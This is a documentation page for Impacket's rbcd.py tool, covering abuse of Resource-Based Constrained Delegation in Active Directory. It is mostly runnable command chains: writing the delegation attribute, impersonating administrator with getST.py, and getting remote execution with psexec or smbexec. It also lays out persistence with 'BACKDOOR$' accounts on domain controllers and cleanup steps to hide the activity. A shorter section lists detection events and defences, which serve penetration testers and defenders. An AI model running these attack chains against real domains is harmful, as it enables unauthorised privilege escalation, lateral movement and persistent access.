# rbcd.py

## Overview
`rbcd.py` is a powerful tool for exploiting and configuring Resource-Based Constrained Delegation (RBCD) in Active Directory environments. This tool is categorized under Privilege Escalation and provides functionality for manipulating the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on computer objects to enable delegation attacks.

## Detailed Description
Resource-Based Constrained Delegation (RBCD) is a Windows Server 2012 feature that allows services to specify which accounts can delegate to them, reversing the traditional delegation model. Unlike traditional constrained delegation where the delegating service specifies target services, RBCD allows the target service (resource) to specify which services can delegate to it.

The `rbcd.py` tool manipulates the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on computer objects to configure RBCD settings. This technique is particularly powerful for privilege escalation because:

1. **Computer Account Control**: If you can modify a computer object's RBCD attribute, you can configure any account to delegate to that computer
2. **Service Impersonation**: Once delegation is configured, you can use S4U2Self and S4U2Proxy to impersonate any domain user to the target service
3. **Privilege Escalation**: This often leads to administrative access on the target computer

### Key Features:
- **RBCD Reading**: Display current delegation configurations on target objects
- **RBCD Writing**: Add new delegation relationships for privilege escalation
- **RBCD Removal**: Remove existing delegation configurations
- **Security Descriptor Management**: Proper handling of ACLs in the delegation attribute
- **Multiple Account Types**: Support for user accounts and computer accounts
- **Flexible Targeting**: Support for sAMAccountName, SID, and Distinguished Name targeting

### Technical Details:
- Modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute via LDAP
- Uses security descriptors with ACEs to control delegation permissions
- Leverages LDAP operations for reading and writing AD object attributes
- Integrates with domain dumping functionality for reconnaissance
- Compatible with both LDAP and LDAPS connections

## Command Line Options

```
usage: rbcd.py [-h] [-delegate-from DELEGATE_FROM] [-action {read,write,remove,flush}]
               [-use-ldaps] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
               [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]
               identity -delegate-to DELEGATE_TO

Python (re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for Kerberos RBCD attacks.

Required Arguments:
  identity              domain.local/username[:password]
  -delegate-to DELEGATE_TO
                        Target account the DACL is to be read/edited/etc.

Optional Arguments:
  -delegate-from DELEGATE_FROM
                        Attacker controlled account to write on the rbcd property of -delegate-to
                        (only when using `-action write`)
  -action {read,write,remove,flush}
                        Action to operate on msDS-AllowedToActOnBehalfOfOtherIdentity (default: read)
  -use-ldaps            Use LDAPS instead of LDAP
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

Connection:
  -dc-ip ip address     IP Address of the domain controller or KDC
  -dc-host hostname     Hostname of the domain controller or KDC
```

## Usage Examples

### Reading RBCD Configuration
```bash
# Read current RBCD configuration on target computer
python3 rbcd.py domain.com/user:password -delegate-to 'TARGET$' -action read

# Read RBCD configuration using NTLM hash
python3 rbcd.py -hashes :ntlmhash domain.com/user -delegate-to 'SERVER01$' -action read

# Read RBCD configuration using Kerberos
python3 rbcd.py -k domain.com/user:password -delegate-to 'WORKSTATION$' -action read
```

### Writing RBCD Configuration
```bash
# Configure RBCD to allow CONTROLLED$ to delegate to TARGET$
python3 rbcd.py domain.com/admin:password -delegate-to 'TARGET$' -delegate-from 'CONTROLLED$' -action write

# Add delegation rights using computer account
python3 rbcd.py domain.com/user:password -delegate-to 'SERVER01$' -delegate-from 'FAKE$' -action write

# Configure RBCD using NTLM hash authentication
python3 rbcd.py -hashes :ntlmhash domain.com/admin -delegate-to 'DC01$' -delegate-from 'BACKDOOR$' -action write
```

### Removing RBCD Configuration
```bash
# Remove specific delegation rights
python3 rbcd.py domain.com/admin:password -delegate-to 'TARGET$' -delegate-from 'CONTROLLED$' -action remove

# Remove delegation using hash authentication
python3 rbcd.py -hashes :ntlmhash domain.com/admin -delegate-to 'SERVER01$' -delegate-from 'FAKE$' -action remove
```

### Flushing RBCD Configuration
```bash
# Remove all delegation rights from target object
python3 rbcd.py domain.com/admin:password -delegate-to 'TARGET$' -action flush

# Flush RBCD configuration using Kerberos
python3 rbcd.py -k domain.com/admin:password -delegate-to 'COMPROMISED$' -action flush
```

### Advanced Connection Options
```bash
# Use LDAPS for encrypted communication
python3 rbcd.py -use-ldaps domain.com/user:password -delegate-to 'TARGET$' -action read

# Specify domain controller explicitly
python3 rbcd.py -dc-ip 192.168.1.10 domain.com/user:password -delegate-to 'TARGET$' -action read

# Use specific DC hostname
python3 rbcd.py -dc-host dc.domain.com domain.com/user:password -delegate-to 'TARGET$' -action read

# Debug mode with timestamps
python3 rbcd.py -debug -ts domain.com/user:password -delegate-to 'TARGET$' -action read
```

## Attack Chain Integration

### Complete RBCD Attack Chain
```bash
# Step 1: Identify computer accounts you can modify (WriteDacl/WriteProperty rights)
python3 dacledit.py domain.com/user:password -action read -target 'TARGET$' -principal user

# Step 2: Create a new computer account (if needed)
python3 addcomputer.py domain.com/user:password -computer-name 'FAKE$' -computer-pass 'Password123!'

# Step 3: Configure RBCD to allow your controlled account to delegate
python3 rbcd.py domain.com/user:password -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write

# Step 4: Request service ticket using S4U2Self and S4U2Proxy
python3 getST.py domain.com/FAKE$:Password123! -spn cifs/TARGET.domain.com -impersonate administrator

# Step 5: Use the forged ticket for access
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.com/administrator@TARGET.domain.com
```

### RBCD with Existing Computer Accounts
```bash
# Step 1: Find computer accounts you control (compromised systems)
python3 secretsdump.py domain.com/admin:password@CONTROLLED-PC.domain.com

# Step 2: Use the computer account hash to configure RBCD
python3 rbcd.py -hashes :computer_hash domain.com/CONTROLLED-PC$ -delegate-to 'TARGET$' -delegate-from 'CONTROLLED-PC$' -action write

# Step 3: Impersonate high-value user to target system
python3 getST.py -hashes :computer_hash domain.com/CONTROLLED-PC$ -spn cifs/TARGET.domain.com -impersonate administrator

# Step 4: Access target system as administrator
export KRB5CCNAME=administrator.ccache
python3 smbexec.py -k -no-pass domain.com/administrator@TARGET.domain.com
```

### Cross-Domain RBCD Attacks
```bash
# Step 1: Configure RBCD across domain trust
python3 rbcd.py domain.com/admin:password -delegate-to 'TARGET$' -delegate-from 'FOREIGN-DOMAIN\user$' -action write

# Step 2: Use foreign domain account for delegation
python3 getST.py foreign.domain.com/user$:password -spn cifs/TARGET.domain.com -impersonate administrator

# Step 3: Access target in different domain
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.com/administrator@TARGET.domain.com
```

### RBCD Persistence Mechanism
```bash
# Step 1: Configure RBCD for persistence on multiple targets
python3 rbcd.py domain.com/admin:password -delegate-to 'DC01$' -delegate-from 'BACKDOOR$' -action write
python3 rbcd.py domain.com/admin:password -delegate-to 'SERVER01$' -delegate-from 'BACKDOOR$' -action write
python3 rbcd.py domain.com/admin:password -delegate-to 'WORKSTATION01$' -delegate-from 'BACKDOOR$' -action write

# Step 2: Verify persistence by listing configurations
python3 rbcd.py domain.com/user:password -delegate-to 'DC01$' -action read
python3 rbcd.py domain.com/user:password -delegate-to 'SERVER01$' -action read

# Step 3: Use persistence for long-term access
python3 getST.py domain.com/BACKDOOR$:password -spn cifs/DC01.domain.com -impersonate administrator
```

### Cleanup and Stealth Operations
```bash
# Step 1: Perform attack operations
python3 rbcd.py domain.com/admin:password -delegate-to 'TARGET$' -delegate-from 'TEMP$' -action write
# ... perform attack activities ...

# Step 2: Clean up RBCD configuration
python3 rbcd.py domain.com/admin:password -delegate-to 'TARGET$' -delegate-from 'TEMP$' -action remove

# Step 3: Remove temporary computer account
python3 addcomputer.py domain.com/admin:password -computer-name 'TEMP$' -delete

# Step 4: Verify cleanup
python3 rbcd.py domain.com/user:password -delegate-to 'TARGET$' -action read
```

## Prerequisites for RBCD Attacks

### Required Permissions
- **WriteDacl**: Permission to modify DACLs on the target computer object
- **WriteProperty**: Permission to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- **Self**: Permission for some delegation scenarios
- **GenericWrite**: Comprehensive write access to the target object

### Account Requirements
- **Controlled Account**: An account you control for delegation (user or computer)
- **Target Computer**: Computer object where you want to configure RBCD
- **Valid Credentials**: Domain credentials with appropriate permissions

### Environment Prerequisites
- **Domain Functional Level**: Windows Server 2012 or higher for RBCD support
- **Kerberos Infrastructure**: Functional KDC and Kerberos authentication
- **Network Access**: LDAP/LDAPS access to domain controller (ports 389/636)

## Security Implications

### Attack Opportunities
- **Privilege Escalation**: Gain administrative access to target computers
- **Lateral Movement**: Move between systems using delegated credentials
- **Persistence**: Establish long-term access through delegation configurations
- **Credential Harvesting**: Access systems as high-privilege users

### Detection Indicators
- **Event ID 4742**: Computer account was changed (RBCD modification)
- **Event ID 4738**: User account was changed (if targeting user accounts)
- **Unusual LDAP Operations**: Modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **S4U2Self/S4U2Proxy Requests**: Kerberos delegation activity
- **Service Ticket Requests**: Unusual SPN requests for delegation

### Defensive Measures
- **Permission Auditing**: Regularly audit who can modify computer objects
- **RBCD Monitoring**: Monitor changes to delegation attributes
- **Privileged Account Protection**: Protect high-value accounts from delegation
- **Computer Account Hardening**: Limit who can create/modify computer accounts
- **Network Segmentation**: Restrict LDAP access to authorized systems

## Common Issues and Troubleshooting

### Permission Denied Errors
```bash
# Error: Could not modify object, insufficient rights
# Solution: Verify you have WriteDacl or WriteProperty on target object
python3 dacledit.py domain.com/user:password -action read -target 'TARGET$' -principal user

# Check specific permissions needed
python3 dacledit.py domain.com/user:password -action read -target 'TARGET$' -rights WriteProperty
```

### Account Not Found Errors
```bash
# Error: Account does not exist
# Solution: Verify account names and add $ for computer accounts
python3 rbcd.py domain.com/user:password -delegate-to 'COMPUTER$' -action read  # Note the $

# Check if account exists in domain
python3 GetADUsers.py domain.com/user:password -all | grep COMPUTER
```

### Delegation Not Working
```bash
# Error: S4U2Proxy fails after RBCD configuration
# Solution: Verify delegation is properly configured and account exists
python3 rbcd.py domain.com/user:password -delegate-to 'TARGET$' -action read

# Check if the delegating account has necessary privileges
python3 findDelegation.py domain.com/user:password | grep CONTROLLED
```

### LDAP Connection Issues
```bash
# Error: LDAP connection failed
# Solution: Check network connectivity and credentials
python3 rbcd.py -debug domain.com/user:password -delegate-to 'TARGET$' -action read

# Try using LDAPS for encrypted connection
python3 rbcd.py -use-ldaps domain.com/user:password -delegate-to 'TARGET$' -action read
```

## Related Tools
- [addcomputer.py](addcomputer.md) - Create computer accounts for RBCD attacks
- [getST.py](getST.md) - Request service tickets using delegation
- [dacledit.py](dacledit.md) - Modify DACLs for RBCD prerequisites
- [findDelegation.py](findDelegation.md) - Discover existing delegation relationships
- [psexec.py](psexec.md) - Execute commands using delegated credentials
- [secretsdump.py](secretsdump.md) - Extract computer account credentials

---

*This documentation is based on the actual source code and functionality of rbcd.py from Impacket.*
